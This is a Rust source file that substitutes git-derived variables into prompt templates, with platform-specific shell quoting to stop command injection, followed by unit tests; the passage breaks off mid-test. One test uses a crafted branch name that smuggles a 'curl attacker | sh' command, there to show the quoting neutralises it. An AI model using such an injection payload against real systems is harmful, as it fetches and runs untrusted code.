use std::collections::{HashMap, HashSet};
use std::process::Command;
use std::sync::OnceLock;
use std::time::{Duration, Instant};

/// Extract template variable names from content.
///
/// Finds `{varname}` patterns and returns unique variable names
/// in order of first appearance. Matches greedily from the first
/// `{` to the first `}`, so `{{nested}}` yields `{nested`.
pub(crate) fn extract_variables(content: &str) -> Vec<String> {
    let mut vars = Vec::new();
    let mut seen = HashSet::new();
    let bytes = content.as_bytes();
    let len = bytes.len();
    let mut i = 0;

    while i < len {
        if bytes[i] == b'{' {
            // Find the closing brace
            if let Some(end) = content[i + 1..].find('}') {
                let name = &content[i + 1..i + 1 + end];
                if !name.is_empty() && seen.insert(name.to_string()) {
                    vars.push(name.to_string());
                }
                i = i + 1 + end + 1; // skip past '}'
            } else {
                break; // no closing brace found, done
            }
        } else {
            i += 1;
        }
    }

    vars
}

/// Replace `{name}` placeholders with values from the variables map.
///
/// Unmatched variables (not present in the map) are left as-is.
pub(crate) fn process_content(content: &str, variables: &HashMap<String, String>) -> String {
    process_content_inner(content, variables, false)
}

/// Shell-safe variant of [`process_content`] for templates that will be
/// executed via `sh -c` / `cmd /C`. Each substituted value is wrapped with a
/// platform-appropriate quoting so that characters like `;`, backticks, `$()`
/// and single quotes inside repo-controlled variables (branch names, commit
/// messages, PR titles, etc.) cannot escape the argument and execute further
/// commands. Literal template text is left untouched — callers remain
/// responsible for putting variable placeholders where a quoted string is
/// syntactically valid (e.g. `echo {branch}`, not `echo $(x){branch}`).
pub(crate) fn process_content_shell_safe(
    content: &str,
    variables: &HashMap<String, String>,
) -> String {
    process_content_inner(content, variables, true)
}

fn process_content_inner(
    content: &str,
    variables: &HashMap<String, String>,
    shell_safe: bool,
) -> String {
    let mut result = String::with_capacity(content.len());
    let bytes = content.as_bytes();
    let len = bytes.len();
    let mut i = 0;

    while i < len {
        if bytes[i] == b'{' {
            if let Some(end) = content[i + 1..].find('}') {
                let name = &content[i + 1..i + 1 + end];
                if let Some(value) = variables.get(name) {
                    if shell_safe {
                        result.push_str(&shell_quote(value));
                    } else {
                        result.push_str(value);
                    }
                } else {
                    // Leave unmatched variable as-is
                    result.push('{');
                    result.push_str(name);
                    result.push('}');
                }
                i = i + 1 + end + 1;
            } else {
                // No closing brace, push rest of string
                result.push_str(&content[i..]);
                break;
            }
        } else {
            // Decode the UTF-8 character starting at byte i and advance
            // past all its bytes. This is safe because '{' is ASCII, so we
            // only reach here for non-'{' leading bytes.
            let ch = content[i..].chars().next().unwrap();
            result.push(ch);
            i += ch.len_utf8();
        }
    }

    result
}

/// Platform-appropriate shell quoting for a single argument.
///
/// On POSIX (`sh -c`) we use single-quote wrapping: `'` → `'\''` and wrap in
/// single quotes, which disables every form of expansion inside the string.
/// On Windows (`cmd /C`) we wrap in double quotes and escape embedded double
/// quotes and shell metacharacters (`^`, `&`, `|`, `<`, `>`) with `^`. The two
/// shells are invoked from `execute_shell_script` and share this entry point.
pub(crate) fn shell_quote(value: &str) -> String {
    #[cfg(target_os = "windows")]
    {
        cmd_shell_quote(value)
    }
    #[cfg(not(target_os = "windows"))]
    {
        posix_shell_quote(value)
    }
}

#[cfg(not(target_os = "windows"))]
fn posix_shell_quote(value: &str) -> String {
    let mut out = String::with_capacity(value.len() + 2);
    out.push('\'');
    for c in value.chars() {
        if c == '\'' {
            // Close the quote, emit an escaped literal single quote, reopen.
            out.push_str("'\\''");
        } else {
            out.push(c);
        }
    }
    out.push('\'');
    out
}

#[cfg(target_os = "windows")]
fn cmd_shell_quote(value: &str) -> String {
    let mut out = String::with_capacity(value.len() + 2);
    out.push('"');
    for c in value.chars() {
        match c {
            '"' => out.push_str("\"\""),
            '^' | '&' | '|' | '<' | '>' | '%' => {
                out.push('^');
                out.push(c);
            }
            _ => out.push(c),
        }
    }
    out.push('"');
    out
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn extract_prompt_variables(content: String) -> Vec<String> {
    extract_variables(&content)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn process_prompt_content(
    content: String,
    variables: HashMap<String, String>,
) -> String {
    process_content(&content, &variables)
}

/// Tauri-exposed wrapper around [`process_content_shell_safe`] for use by the
/// Smart Prompts shell-execution path. Callers must prefer this over
/// `process_prompt_content` whenever the resulting string is going to be
/// handed to `sh -c` / `cmd /C`, otherwise repo-controlled variables like
/// `{branch}` or `{pr_title}` can execute arbitrary commands.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn process_prompt_content_shell_safe(
    content: String,
    variables: HashMap<String, String>,
) -> String {
    process_content_shell_safe(&content, &variables)
}

const MAX_VARIABLE_LEN: usize = 50_000;

/// Run a git command in the given repo and return trimmed stdout, or None on failure.
fn git_output(repo_path: &str, args: &[&str]) -> Option<String> {
    let git_bin = crate::cli::resolve_cli("git");
    let output = Command::new(&git_bin)
        .arg("-C")
        .arg(repo_path)
        .arg("--no-optional-locks")
        .args(args)
        .output()
        .ok()?;
    if output.status.success() {
        // Return empty string for successful commands with no output (e.g. no staged changes).
        // This ensures the variable exists in the context map so prompts don't report
        // "unresolved_variables" — they can check for empty content themselves.
        Some(String::from_utf8_lossy(&output.stdout).trim().to_string())
    } else {
        None
    }
}

/// Truncate a string to `max` bytes, appending a marker if truncated.
fn truncate(s: String, max: usize) -> String {
    if s.len() <= max {
        return s;
    }
    // Find the last char boundary at or before `max` bytes
    let end = s
        .char_indices()
        .take_while(|(i, _)| *i < max)
        .last()
        .map(|(i, c)| i + c.len_utf8())
        .unwrap_or(max);
    let mut truncated = s[..end].to_string();
    truncated.push_str("\n[...truncated]");
    truncated
}

/// Detect the base branch by checking which of main/master/develop exists locally.
/// Parse owner and slug from a git remote URL.
/// Handles SSH (git@github.com:owner/repo.git) and HTTPS (https://github.com/owner/repo.git).
fn parse_remote_owner_slug(url: &str) -> Option<(String, String)> {
    let path = if let Some(rest) = url.strip_prefix("git@") {
        // git@github.com:owner/repo.git → owner/repo.git
        rest.split_once(':').map(|(_, p)| p)?
    } else {
        // https://github.com/owner/repo.git → /owner/repo.git (after host)
        let without_scheme = url
            .strip_prefix("https://")
            .or_else(|| url.strip_prefix("http://"))?;
        // Skip the host: github.com/owner/repo.git
        without_scheme.find('/').map(|i| &without_scheme[i + 1..])?
    };
    let path = path.trim_end_matches(".git").trim_end_matches('/');
    let mut parts = path.splitn(2, '/');
    let owner = parts.next()?.to_string();
    let slug = parts.next()?.to_string();
    if owner.is_empty() || slug.is_empty() {
        return None;
    }
    Some((owner, slug))
}

pub(crate) fn detect_base_branch(repo_path: &str) -> Option<String> {
    let output = git_output(
        repo_path,
        &["branch", "--list", "main", "master", "develop"],
    )?;
    // Each line is like "  main" or "* main"; pick first in priority order.
    let branches: Vec<String> = output
        .lines()
        .map(|l| l.trim_start_matches('*').trim().to_string())
        .collect();
    for candidate in &["main", "master", "develop"] {
        if branches.iter().any(|b| b == candidate) {
            return Some(candidate.to_string());
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Per-variable cache — avoids re-running git commands across rapid calls.
// ---------------------------------------------------------------------------

const VAR_CACHE_TTL: Duration = Duration::from_secs(3);

struct CacheEntry {
    value: String,
    fetched_at: Instant,
}

fn var_cache() -> &'static parking_lot::Mutex<HashMap<(String, String), CacheEntry>> {
    static CACHE: OnceLock<parking_lot::Mutex<HashMap<(String, String), CacheEntry>>> =
        OnceLock::new();
    CACHE.get_or_init(|| parking_lot::Mutex::new(HashMap::new()))
}

/// Drop all cached prompt-variable entries for a repo.
///
/// Hooked into `AppState::invalidate_repo_caches` so that git-backed prompt
/// vars (`{diff}`, `{changed_files}`, `{last_commit}`, …) reflect repo state
/// immediately after a commit/checkout instead of lingering up to
/// `VAR_CACHE_TTL` (3s).
pub(crate) fn invalidate_repo_vars(_path: &str) {
    // Clears the WHOLE cache, not just `_path`'s entries — deliberate.
    // `AppState::invalidate_repo_caches` (this fn's only caller) is invoked
    // with the repo *root* even for a change detected inside a watched
    // worktree (`repo_watcher.rs`'s `sync_worktree_watches`), but since the
    // cwd-vs-active-repo fix, prompt variables can be resolved against a
    // worktree PATH, not just the root — so a per-repo-string retain would
    // never touch (and never invalidate) the worktree-keyed cache entries a
    // change inside that worktree should stale out. Exact-string matching
    // also can't handle the sibling worktree layout
    // (`<repo_parent>/<repo_name>__wt/<branch>`, see `worktree.rs`'s
    // `resolve_worktree_dir_for_repo`), which isn't a path *under* the root
    // at all. The cache holds at most a couple dozen entries with a 3s TTL
    // and exists purely to dedupe rapid calls, so clearing everything on any
    // repo-cache invalidation costs nothing measurable.
    var_cache().lock().clear();
}

fn resolve_single_var(repo_path: &str, var: &str) -> Option<String> {
    match var {
        "branch" => git_output(repo_path, &["rev-parse", "--abbrev-ref", "HEAD"]),
        "diff" => git_output(repo_path, &["diff"]).map(|v| truncate(v, MAX_VARIABLE_LEN)),
        "staged_diff" => {
            git_output(repo_path, &["diff", "--staged"]).map(|v| truncate(v, MAX_VARIABLE_LEN))
        }
        "changed_files" => git_output(repo_path, &["status", "--short"]),
        "commit_log" => git_output(repo_path, &["log", "--oneline", "-20"]),
        "last_commit" => git_output(repo_path, &["log", "-1", "--format=%H %s"]),
        "conflict_files" => git_output(repo_path, &["diff", "--name-only", "--diff-filter=U"]),
        "stash_list" => git_output(repo_path, &["stash", "list"]),
        "remote_url" => git_output(repo_path, &["config", "--get", "remote.origin.url"]),
        "current_user" => git_output(repo_path, &["config", "user.name"]),
        // Delegates to the same override-aware resolver `TUIC_BASE_BRANCH`
        // uses (per-repo setting → global default → `detect_base_branch` for
        // "automatic") — calling `detect_base_branch` directly here used to
        // diverge from that whenever a repo had a configured base branch.
        "base_branch" => crate::config::resolve_effective_base_branch(repo_path),
        "branch_status" => git_output(
            repo_path,
            &["rev-list", "--left-right", "--count", "@{upstream}...HEAD"],
        )
        .and_then(|s| {
            let parts: Vec<&str> = s.split_whitespace().collect();
            if parts.len() == 2 {
                Some(format!("{} ahead, {} behind", parts[1], parts[0]))
            } else {
                None
            }
        }),
        _ => None,
    }
}

const ALL_VARS: &[&str] = &[
    "branch",
    "diff",
    "staged_diff",
    "changed_files",
    "commit_log",
    "last_commit",
    "conflict_files",
    "stash_list",
    "remote_url",
    "current_user",
    "base_branch",
    "branch_status",
    "dirty_files_count",
    "repo_owner",
    "repo_slug",
    "repo_name",
    "repo_path",
    "worktree_path",
    "main_repo_path",
    "worktree_name",
    "is_worktree",
];

fn resolve_vars(repo_path: &str, needed: &[String]) -> HashMap<String, String> {
    let now = Instant::now();
    let mut result = HashMap::new();
    let needed_set: HashSet<&str> = needed.iter().map(|s| s.as_str()).collect();

    // Non-git variables (no process spawn).
    if needed_set.contains("repo_path") {
        result.insert("repo_path".to_string(), repo_path.to_string());
    }

    // Worktree-aware vars (repo_name included: it now means the MAIN
    // checkout's name, not repo_path's basename — see the deliberate
    // semantic change below) piggyback on script_env::ScriptContext, which
    // already derives exactly this via file reads (commondir, HEAD) for the
    // TUIC_* script env — no separate git subprocess needed here.
    if needed_set.contains("repo_name")
        || needed_set.contains("worktree_path")
        || needed_set.contains("main_repo_path")
        || needed_set.contains("worktree_name")
        || needed_set.contains("is_worktree")
    {
        let ctx = crate::script_env::ScriptContext::derive(
            crate::script_env::ScriptKind::Prompt,
            std::path::Path::new(repo_path),
        );
        let ctx_map = ctx.as_map();
        for (var_name, tuic_key) in [
            ("worktree_path", "TUIC_WORKTREE_PATH"),
            ("main_repo_path", "TUIC_MAIN_REPO_PATH"),
            ("worktree_name", "TUIC_WORKTREE_NAME"),
            ("is_worktree", "TUIC_IS_WORKTREE"),
        ] {
            if needed_set.contains(var_name)
                && let Some(v) = ctx_map.get(tuic_key)
            {
                result.insert(var_name.to_string(), v.clone());
            }
        }
        if needed_set.contains("repo_name") {
            if let Some(v) = ctx_map.get("TUIC_REPO_NAME") {
                // Deliberate semantic change: repo_name is now the MAIN
                // checkout's directory name, not repo_path's basename —
                // without this, {repo_name} silently flips from e.g.
                // "tuicommander" to "startup-scripts" whenever a worktree
                // terminal is focused. Preserves today's value in the common
                // case (repo_path is already the main checkout).
                result.insert("repo_name".to_string(), v.clone());
            } else if let Some(name) = std::path::Path::new(repo_path)
                .file_name()
                .and_then(|n| n.to_str())
            {
                // Non-git path (or otherwise undetectable): fall back to the
                // old plain-basename behavior rather than leaving repo_name
                // unresolved.
                result.insert("repo_name".to_string(), name.to_string());
            }
        }
    }

    // Collect git vars we need, including implicit dependencies for derived vars.
    let directly_resolvable: &[&str] = &[
        "branch",
        "diff",
        "staged_diff",
        "changed_files",
        "commit_log",
        "last_commit",
        "conflict_files",
        "stash_list",
        "remote_url",
        "current_user",
        "base_branch",
        "branch_status",
    ];
    let mut git_needed: HashSet<&str> = HashSet::new();
    for var in directly_resolvable {
        if needed_set.contains(var) {
            git_needed.insert(var);
        }
    }
    if needed_set.contains("dirty_files_count") {
        git_needed.insert("changed_files");
    }
    if needed_set.contains("repo_owner") || needed_set.contains("repo_slug") {
        git_needed.insert("remote_url");
    }

    // Check cache — short lock, no I/O.
    let mut to_fetch: Vec<&str> = Vec::new();
    {
        let cache = var_cache().lock();
        for var in &git_needed {
            let key = (repo_path.to_string(), var.to_string());
            if let Some(entry) = cache.get(&key)
                && now.duration_since(entry.fetched_at) < VAR_CACHE_TTL
            {
                result.insert(var.to_string(), entry.value.clone());
                continue;
            }
            to_fetch.push(var);
        }
    }

    // Resolve cache misses sequentially (no lock held).
    if !to_fetch.is_empty() {
        let resolved_at = Instant::now();
        let mut fresh: Vec<(String, String)> = Vec::new();
        for var in &to_fetch {
            if let Some(value) = resolve_single_var(repo_path, var) {
                fresh.push((var.to_string(), value));
            }
        }
        let mut cache = var_cache().lock();
        for (name, value) in fresh {
            cache.insert(
                (repo_path.to_string(), name.clone()),
                CacheEntry {
                    value: value.clone(),
                    fetched_at: resolved_at,
                },
            );
            result.insert(name, value);
        }
    }

    // Derive computed variables from resolved ones.
    if needed_set.contains("dirty_files_count")
        && let Some(changed) = result.get("changed_files")
    {
        let count = changed.lines().filter(|l| !l.is_empty()).count();
        result.insert("dirty_files_count".to_string(), count.to_string());
    }
    if (needed_set.contains("repo_owner") || needed_set.contains("repo_slug"))
        && let Some(url) = result.get("remote_url").cloned()
        && let Some((owner, slug)) = parse_remote_owner_slug(&url)
    {
        if needed_set.contains("repo_owner") {
            result.insert("repo_owner".to_string(), owner);
        }
        if needed_set.contains("repo_slug") {
            result.insert("repo_slug".to_string(), slug);
        }
    }

    // Strip dependency-only vars not in the original needed set.
    result.retain(|k, _| needed_set.contains(k.as_str()));
    result
}

// ---------------------------------------------------------------------------
// Tauri commands
// ---------------------------------------------------------------------------

#[derive(serde::Serialize)]
pub(crate) struct PromptVarsResult {
    pub vars: HashMap<String, String>,
    pub needed: Vec<String>,
}

/// Single-call variable resolver for smart prompts.
///
/// Extracts `{var}` names from `content`, resolves only the git-backed ones
/// that actually appear, and returns both the resolved map and the full list
/// of variable names (so the frontend can detect unresolved ones without a
/// second IPC round-trip).
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) async fn resolve_prompt_variables(
    content: String,
    repo_path: Option<String>,
) -> Result<PromptVarsResult, String> {
    tokio::task::spawn_blocking(move || {
        let needed = extract_variables(&content);
        let vars = match &repo_path {
            Some(rp) if !rp.is_empty() => resolve_vars(rp, &needed),
            _ => HashMap::new(),
        };
        PromptVarsResult { vars, needed }
    })
    .await
    .map_err(|e| format!("spawn_blocking join error: {e}"))
}

/// Resolve all git context variables (used by the MCP endpoint).
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) async fn resolve_context_variables(
    repo_path: String,
) -> Result<HashMap<String, String>, String> {
    tokio::task::spawn_blocking(move || {
        let all: Vec<String> = ALL_VARS.iter().map(|s| s.to_string()).collect();
        resolve_vars(&repo_path, &all)
    })
    .await
    .map_err(|e| format!("spawn_blocking join error: {e}"))
}

#[cfg(test)]
mod tests {
    use super::*;

    // --- extract_variables tests ---

    #[test]
    fn extract_variables_basic() {
        let vars = extract_variables("Hello {name}, welcome to {place}!");
        assert_eq!(vars, vec!["name", "place"]);
    }

    #[test]
    fn extract_variables_empty_string() {
        let vars = extract_variables("");
        assert!(vars.is_empty());
    }

    #[test]
    fn extract_variables_no_vars() {
        let vars = extract_variables("Hello world!");
        assert!(vars.is_empty());
    }

    #[test]
    fn extract_variables_deduplicates() {
        let vars = extract_variables("{name} and {name} again");
        assert_eq!(vars, vec!["name"]);
    }

    #[test]
    fn extract_variables_multiple() {
        let vars = extract_variables("{a} and {b}");
        assert_eq!(vars, vec!["a", "b"]);
    }

    #[test]
    fn extract_variables_nested_braces() {
        // Matches greedily: "{{nested}}" captures "{nested" as the variable name
        let vars = extract_variables("{{nested}}");
        assert_eq!(vars, vec!["{nested"]);
    }

    #[test]
    fn extract_variables_unclosed_brace() {
        let vars = extract_variables("Hello {name");
        assert!(vars.is_empty());
    }

    // --- process_content tests ---

    #[test]
    fn process_content_single_var() {
        let mut vars = HashMap::new();
        vars.insert("name".to_string(), "World".to_string());
        let result = process_content("Hello {name}!", &vars);
        assert_eq!(result, "Hello World!");
    }

    #[test]
    fn process_content_multiple_vars() {
        let mut vars = HashMap::new();
        vars.insert("first".to_string(), "John".to_string());
        vars.insert("last".to_string(), "Doe".to_string());
        let result = process_content("Hello {first} {last}!", &vars);
        assert_eq!(result, "Hello John Doe!");
    }

    #[test]
    fn process_content_repeated_var() {
        let mut vars = HashMap::new();
        vars.insert("x".to_string(), "5".to_string());
        let result = process_content("{x} + {x} = 2{x}", &vars);
        assert_eq!(result, "5 + 5 = 25");
    }

    #[test]
    fn process_content_unmatched_var_left_as_is() {
        let mut vars = HashMap::new();
        vars.insert("name".to_string(), "World".to_string());
        let result = process_content("Hello {name}, {unknown}!", &vars);
        assert_eq!(result, "Hello World, {unknown}!");
    }

    #[test]
    fn process_content_no_vars() {
        let result = process_content("No variables here", &HashMap::new());
        assert_eq!(result, "No variables here");
    }

    #[test]
    fn process_content_empty_string() {
        let result = process_content("", &HashMap::new());
        assert_eq!(result, "");
    }

    // --- UTF-8 multi-byte tests ---

    #[test]
    fn extract_variables_with_multibyte_utf8() {
        let vars = extract_variables("Héllo {name}, 日本語 {place}!");
        assert_eq!(vars, vec!["name", "place"]);
    }

    #[test]
    fn process_content_with_accented_chars() {
        let mut vars = HashMap::new();
        vars.insert("name".to_string(), "René".to_string());
        let result = process_content("Héllo {name}!", &vars);
        assert_eq!(result, "Héllo René!");
    }

    #[test]
    fn process_content_with_cjk_chars() {
        let mut vars = HashMap::new();
        vars.insert("name".to_string(), "World".to_string());
        let result = process_content("日本語 {name}!", &vars);
        assert_eq!(result, "日本語 World!");
    }

    #[test]
    fn process_content_with_emoji() {
        let mut vars = HashMap::new();
        vars.insert("name".to_string(), "Bot".to_string());
        let result = process_content("Hello 🌍 {name}! 🎉", &vars);
        assert_eq!(result, "Hello 🌍 Bot! 🎉");
    }

    // --- resolve_context_variables tests ---

    #[tokio::test]
    async fn resolve_context_variables_non_git_path() {
        let vars = resolve_context_variables("/tmp".to_string()).await.unwrap();
        // Should return empty or near-empty map, no panic
        assert!(vars.get("branch").is_none_or(|branch| !branch.is_empty()));
    }

    // --- resolve_vars git-backed tests (gap-closing: `resolve_vars`'s git
    // paths were previously exercised only through resolve_context_variables_
    // non_git_path, which never touches a real repo at all) ---

    /// A `git init -b main` repo with one commit. Explicitly picks the
    /// initial branch name rather than relying on `git init`'s default, which
    /// depends on the *running user's* `init.defaultBranch` config and would
    /// make `resolve_vars_reports_current_branch` flaky across machines.
    fn setup_prompt_test_repo() -> tempfile::TempDir {
        let dir = tempfile::TempDir::new().expect("temp dir");
        let run = |args: &[&str]| {
            let out = Command::new("git")
                .args(args)
                .current_dir(dir.path())
                .output()
                .expect("git command");
            assert!(
                out.status.success(),
                "git {:?} failed: {}",
                args,
                String::from_utf8_lossy(&out.stderr)
            );
        };
        run(&["init", "-b", "main"]);
        run(&["config", "user.email", "test@test.com"]);
        run(&["config", "user.name", "Test"]);
        std::fs::write(dir.path().join("README.md"), "# Test").expect("write file");
        run(&["add", "."]);
        run(&["commit", "-m", "Initial commit"]);
        dir
    }

    // NOTE on test isolation: var_cache() is a process-global OnceLock<Mutex<..>>
    // keyed by (repo_path, var). Each test below uses its own freshly created
    // TempDir, so the cache keys never collide across tests — #[serial_test::serial]
    // is not needed here. A test that resolves, mutates the repo, then
    // re-resolves the *same* var within VAR_CACHE_TTL (3s) would read the stale
    // cached value; none of these do that, but call invalidate_repo_vars(path)
    // between such steps if a future test needs to.

    #[test]
    fn resolve_vars_reports_current_branch() {
        let repo = setup_prompt_test_repo();
        let repo_path = repo.path().to_string_lossy().to_string();
        let vars = resolve_vars(&repo_path, &["branch".to_string()]);
        assert_eq!(vars.get("branch").map(String::as_str), Some("main"));
    }

    #[test]
    fn resolve_vars_diff_and_changed_files_reflect_working_tree() {
        let repo = setup_prompt_test_repo();
        let repo_path = repo.path().to_string_lossy().to_string();
        std::fs::write(repo.path().join("README.md"), "# Test\nchanged").expect("write");
        std::fs::write(repo.path().join("new.txt"), "new").expect("write");

        let vars = resolve_vars(
            &repo_path,
            &["diff".to_string(), "changed_files".to_string()],
        );
        assert!(
            vars.get("diff").is_some_and(|d| d.contains("+changed")),
            "diff should show the modified line: {:?}",
            vars.get("diff")
        );
        let changed = vars.get("changed_files").expect("changed_files present");
        assert!(changed.contains("README.md"));
        assert!(changed.contains("new.txt"));
    }

    #[test]
    fn resolve_vars_dirty_files_count_counts_status_lines() {
        let repo = setup_prompt_test_repo();
        let repo_path = repo.path().to_string_lossy().to_string();
        std::fs::write(repo.path().join("a.txt"), "a").expect("write");
        std::fs::write(repo.path().join("b.txt"), "b").expect("write");

        let vars = resolve_vars(&repo_path, &["dirty_files_count".to_string()]);
        assert_eq!(vars.get("dirty_files_count").map(String::as_str), Some("2"));
    }

    #[test]
    fn resolve_vars_repo_owner_slug_from_remote() {
        let repo = setup_prompt_test_repo();
        let repo_path = repo.path().to_string_lossy().to_string();
        let out = Command::new("git")
            .args(["remote", "add", "origin", "git@github.com:acme/widgets.git"])
            .current_dir(repo.path())
            .output()
            .expect("git remote add");
        assert!(out.status.success());

        let vars = resolve_vars(
            &repo_path,
            &[
                "repo_owner".to_string(),
                "repo_slug".to_string(),
                "remote_url".to_string(),
            ],
        );
        assert_eq!(vars.get("repo_owner").map(String::as_str), Some("acme"));
        assert_eq!(vars.get("repo_slug").map(String::as_str), Some("widgets"));
        assert_eq!(
            vars.get("remote_url").map(String::as_str),
            Some("git@github.com:acme/widgets.git")
        );
    }

    #[test]
    #[serial_test::serial]
    fn resolve_vars_base_branch_honors_the_configured_override() {
        // Regression test: `resolve_single_var`'s "base_branch" arm used to call
        // `detect_base_branch` directly, bypassing the per-repo "Branch From"
        // setting entirely — so a Smart Prompt {base_branch} could disagree with
        // TUIC_BASE_BRANCH (which already went through
        // `config::resolve_effective_base_branch`) for the exact same repo.
        let dir = tempfile::TempDir::new().unwrap();
        let _guard = crate::config::set_config_dir_override(dir.path().to_path_buf());

        let repo = setup_prompt_test_repo();
        let repo_path = repo.path().to_string_lossy().to_string();
        // `main` is the repo's real current branch — configure an override that
        // detect_base_branch alone would never produce, to prove the override
        // (not just detection) is what's actually being consulted.
        let out = Command::new("git")
            .args(["checkout", "-b", "develop"])
            .current_dir(repo.path())
            .output()
            .expect("git checkout -b develop");
        assert!(out.status.success());

        let mut map = crate::config::RepoSettingsMap::default();
        map.repos.insert(
            repo_path.clone(),
            crate::config::RepoSettingsEntry {
                path: repo_path.clone(),
                base_branch: Some("develop".to_string()),
                ..crate::config::RepoSettingsEntry::default()
            },
        );
        crate::config::save_repo_settings(map).expect("save repo settings");

        let vars = resolve_vars(&repo_path, &["base_branch".to_string()]);
        assert_eq!(
            vars.get("base_branch").map(String::as_str),
            Some("develop"),
            "must reflect the configured override, matching config::resolve_effective_base_branch"
        );
    }

    #[test]
    fn resolve_vars_returns_only_requested_vars() {
        // Pins the `result.retain` behavior: repo_owner/repo_slug are derived
        // from remote_url internally, but must not leak into the output map
        // unless the caller actually asked for them.
        let repo = setup_prompt_test_repo();
        let repo_path = repo.path().to_string_lossy().to_string();
        Command::new("git")
            .args(["remote", "add", "origin", "git@github.com:acme/widgets.git"])
            .current_dir(repo.path())
            .output()
            .expect("git remote add");

        let vars = resolve_vars(&repo_path, &["repo_owner".to_string()]);
        assert!(vars.contains_key("repo_owner"));
        assert!(
            !vars.contains_key("remote_url"),
            "remote_url is a resolver-internal dependency, not requested — must not leak: {vars:?}"
        );
    }

    #[test]
    fn all_vars_are_all_resolvable() {
        // First test to ever assert ALL_VARS's contents. On a fully-populated
        // repo (a commit, a remote, an upstream, some dirty files), every name
        // in ALL_VARS should resolve to *something* except the ones that are
        // legitimately absent even in a healthy repo — pin those exceptions
        // explicitly rather than silently accepting a shrinking list.
        let repo = setup_prompt_test_repo();
        let repo_path = repo.path().to_string_lossy().to_string();
        std::fs::write(repo.path().join("dirty.txt"), "dirty").expect("write");
        Command::new("git")
            .args(["remote", "add", "origin", "git@github.com:acme/widgets.git"])
            .current_dir(repo.path())
            .output()
            .expect("git remote add");

        let all: Vec<String> = ALL_VARS.iter().map(|s| s.to_string()).collect();
        let vars = resolve_vars(&repo_path, &all);

        // Legitimately absent with no upstream configured, even in an
        // otherwise fully-populated repo. `conflict_files`/`stash_list` are
        // NOT in this list: git_output populates the key even when the
        // underlying git command succeeds with empty output (nothing
        // stashed / nothing conflicted still yields "" via git_output's own
        // "successful-but-empty" contract, prompt.rs's git_output doc
        // comment above) — only branch_status's `@{upstream}` genuinely
        // fails (non-zero exit) without a configured upstream.
        const EXPECTED_ABSENT: &[&str] = &["branch_status"];

        for name in ALL_VARS {
            if EXPECTED_ABSENT.contains(name) {
                continue;
            }
            assert!(
                vars.contains_key(*name),
                "ALL_VARS entry {name:?} did not resolve to anything on a fully-populated repo"
            );
        }
    }

    #[test]
    fn worktree_vars_on_main_checkout_report_not_a_worktree() {
        let repo = setup_prompt_test_repo();
        let repo_path = repo.path().to_string_lossy().to_string();

        let vars = resolve_vars(
            &repo_path,
            &[
                "worktree_path".to_string(),
                "main_repo_path".to_string(),
                "is_worktree".to_string(),
            ],
        );
        let canonical = repo
            .path()
            .canonicalize()
            .unwrap()
            .to_string_lossy()
            .to_string();
        assert_eq!(vars.get("worktree_path"), Some(&canonical));
        assert_eq!(vars.get("main_repo_path"), Some(&canonical));
        assert_eq!(vars.get("is_worktree").map(String::as_str), Some("false"));
    }

    #[test]
    fn worktree_vars_in_linked_worktree_report_main_repo_path() {
        let repo = setup_prompt_test_repo();
        let worktrees_dir = repo.path().join("worktrees");
        let config = crate::worktree::WorktreeConfig {
            task_name: "feature-x".to_string(),
            base_repo: repo.path().to_string_lossy().to_string(),
            branch: Some("feature-x".to_string()),
            create_branch: true,
        };
        let wt = crate::worktree::create_worktree_internal(&worktrees_dir, &config, None)
            .expect("create worktree");
        let wt_path = wt.path.to_string_lossy().to_string();

        let vars = resolve_vars(
            &wt_path,
            &[
                "worktree_path".to_string(),
                "main_repo_path".to_string(),
                "worktree_name".to_string(),
                "is_worktree".to_string(),
                "branch".to_string(),
            ],
        );
        let main_canonical = repo
            .path()
            .canonicalize()
            .unwrap()
            .to_string_lossy()
            .to_string();
        assert_eq!(
            vars.get("main_repo_path"),
            Some(&main_canonical),
            "main_repo_path must point at the main checkout, not the worktree itself"
        );
        assert_eq!(
            vars.get("worktree_path"),
            Some(
                &wt.path
                    .canonicalize()
                    .unwrap()
                    .to_string_lossy()
                    .to_string()
            )
        );
        assert_eq!(
            vars.get("worktree_name").map(String::as_str),
            Some("feature-x")
        );
        assert_eq!(vars.get("is_worktree").map(String::as_str), Some("true"));
        assert_eq!(vars.get("branch").map(String::as_str), Some("feature-x"));
    }

    #[test]
    fn repo_name_stays_the_main_repo_name_inside_a_worktree() {
        // Deliberate semantic pin: without deriving repo_name from
        // main_repo_path, it would silently flip from the main checkout's
        // name to the worktree's own directory name whenever a worktree
        // path is resolved against.
        let repo = setup_prompt_test_repo();
        let repo_name = repo
            .path()
            .canonicalize()
            .unwrap()
            .file_name()
            .unwrap()
            .to_string_lossy()
            .to_string();

        let worktrees_dir = repo.path().join("worktrees");
        let config = crate::worktree::WorktreeConfig {
            task_name: "repo-name-test".to_string(),
            base_repo: repo.path().to_string_lossy().to_string(),
            branch: Some("repo-name-test".to_string()),
            create_branch: true,
        };
        let wt = crate::worktree::create_worktree_internal(&worktrees_dir, &config, None)
            .expect("create worktree");

        let vars_at_main = resolve_vars(&repo.path().to_string_lossy(), &["repo_name".to_string()]);
        let vars_at_worktree = resolve_vars(&wt.path.to_string_lossy(), &["repo_name".to_string()]);
        assert_eq!(vars_at_main.get("repo_name"), Some(&repo_name));
        assert_eq!(
            vars_at_worktree.get("repo_name"),
            Some(&repo_name),
            "repo_name must stay the MAIN checkout's name even when resolved \
             against a worktree path, not the worktree's own directory name \
             (which would be \"repo-name-test\" here)"
        );
    }

    // --- process_content_shell_safe tests ---

    #[test]
    fn shell_safe_wraps_plain_value() {
        let mut vars = HashMap::new();
        vars.insert("branch".into(), "main".into());
        let result = process_content_shell_safe("echo {branch}", &vars);
        #[cfg(not(target_os = "windows"))]
        assert_eq!(result, "echo 'main'");
        #[cfg(target_os = "windows")]
        assert_eq!(result, "echo \"main\"");
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn shell_safe_escapes_embedded_single_quote() {
        // Branch name crafted as a POSIX second-order injection vector.
        // The emitted script wraps the value in single quotes using the
        // standard `'\''` dance for every embedded `'`.
        let mut vars = HashMap::new();
        vars.insert("branch".into(), "main'; curl attacker | sh; echo '".into());
        let result = process_content_shell_safe("git checkout {branch}", &vars);
        assert_eq!(
            result,
